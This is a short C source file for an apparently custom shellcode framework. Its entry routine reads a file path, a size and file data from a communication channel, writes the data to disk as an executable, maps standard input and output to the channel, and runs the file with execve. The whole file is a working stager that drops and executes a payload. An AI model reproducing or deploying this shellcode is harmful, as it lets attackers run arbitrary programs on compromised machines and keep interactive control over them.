#include <factory.h>
#include "helpers/io.c"
#include "helpers/memory.c"
#include "helpers/socket.c"
#include "helpers/process.c"

SHELLCODE_ENTRY {

    struct channel chan = get_communication_channel();
    unsigned int file_sz;
    char file_path[256];
    void *file_contents;

    /* Read the path. */
    _read(chan.rx, file_path, sizeof(file_path));

    /* Read the file size. */
    _read(chan.rx, &file_sz, sizeof(file_sz));
    
    /* Read the file data. */
    file_contents = _malloc(file_sz);
    _read(chan.rx, file_contents, file_sz);

    /* Drop executable file. */
    drop_file(file_path, S_IRUSR | S_IWUSR | S_IXUSR, file_contents, file_sz); 

    char *const argv[] = { NULL };
    char *const envp[] = { NULL };

    _dup2(chan.rx, stdin);
    _dup2(chan.tx, stdout);
    _dup2(chan.tx, stderr);
    _execve(file_path, argv, envp);

} SHELLCODE_END
